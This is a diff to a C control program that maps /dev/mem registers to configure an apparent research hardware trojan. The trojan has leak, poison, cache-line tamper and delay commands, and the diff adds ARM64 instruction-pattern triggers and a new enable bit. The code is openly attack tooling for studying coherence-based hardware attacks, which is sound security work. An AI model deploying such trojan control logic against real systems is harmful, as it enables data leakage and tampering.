@@ -28,11 +28,12 @@
 #define ADTEN_pos   19
 #define PDTEN_pos   20
 #define MONEN_pos   21
-#define CMD_pos     22
+#define CMD_pos     22 
     #define CMD_LEAK        0
     #define CMD_POISON      1
     #define CMD_TAMPER_CL   2
     #define CMD_DELAY_CR    3
+#define STENDEN_pos 26 
 
 // Status Reg bits
 #define OSH_END_pos 0
@@ -102,6 +103,25 @@ int main(int argc, char *argv[]) {
     static unsigned int *PATTERN14;          
     static unsigned int *PATTERN15; 
     static unsigned int *PATTERN_SIZE; 
+    static unsigned int *WORD_INDEX; 
+    static unsigned int *END_PATTERN0;       
+    static unsigned int *END_PATTERN1;           
+    static unsigned int *END_PATTERN2;           
+    static unsigned int *END_PATTERN3;           
+    static unsigned int *END_PATTERN4;           
+    static unsigned int *END_PATTERN5;           
+    static unsigned int *END_PATTERN6;           
+    static unsigned int *END_PATTERN7;           
+    static unsigned int *END_PATTERN8;           
+    static unsigned int *END_PATTERN9;           
+    static unsigned int *END_PATTERN10;          
+    static unsigned int *END_PATTERN11;          
+    static unsigned int *END_PATTERN12;          
+    static unsigned int *END_PATTERN13;          
+    static unsigned int *END_PATTERN14;          
+    static unsigned int *END_PATTERN15; 
+    static unsigned int *END_PATTERN_SIZE; 
+
 
     // Open /dev/mem to access physical memory
     mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
@@ -167,6 +187,24 @@ int main(int argc, char *argv[]) {
     PATTERN14 = map_base+46;
     PATTERN15 = map_base+47;
     PATTERN_SIZE = map_base+48;
+    WORD_INDEX = map_base+49;
+    END_PATTERN0 = map_base+50;
+    END_PATTERN1 = map_base+51;
+    END_PATTERN2 = map_base+52;
+    END_PATTERN3 = map_base+53;
+    END_PATTERN4 = map_base+54;
+    END_PATTERN5 = map_base+55;
+    END_PATTERN6 = map_base+56;
+    END_PATTERN7 = map_base+57;
+    END_PATTERN8 = map_base+58;
+    END_PATTERN9 = map_base+59;
+    END_PATTERN10 = map_base+60;
+    END_PATTERN11 = map_base+61;
+    END_PATTERN12 = map_base+62;
+    END_PATTERN13 = map_base+63;
+    END_PATTERN14 = map_base+64;
+    END_PATTERN15 = map_base+65;
+    END_PATTERN_SIZE = map_base+66;
     
     // Pattern to search 
     *PATTERN0  = 0xaa1c03e1; 
@@ -188,7 +226,13 @@ int main(int argc, char *argv[]) {
 
     *PATTERN_SIZE = 4;
 
-    
+    *END_PATTERN0  = 0xfa401042; 
+    *END_PATTERN1  = 0x54001389; 
+    *END_PATTERN2  = 0xf100003f; 
+    *END_PATTERN3  = 0x54fffc8d; 
+
+    *END_PATTERN_SIZE = 4;
+
     *p_delay = atoi(argv[2]);
     
     if (strcmp(argv[1], "en") == 0) {
@@ -199,6 +243,7 @@ int main(int argc, char *argv[]) {
                     | (CMD_DELAY_CR << CMD_pos)
                     | (FUNC_DMY << FUNC_pos) 
                     // | (1 << PDTEN_pos)               
+                    | (1 << STENDEN_pos)               
                     | (1 << MONEN_pos)               
                     | (1<< EN_pos);
         printf(" Coherent Trojan Configured!\n");
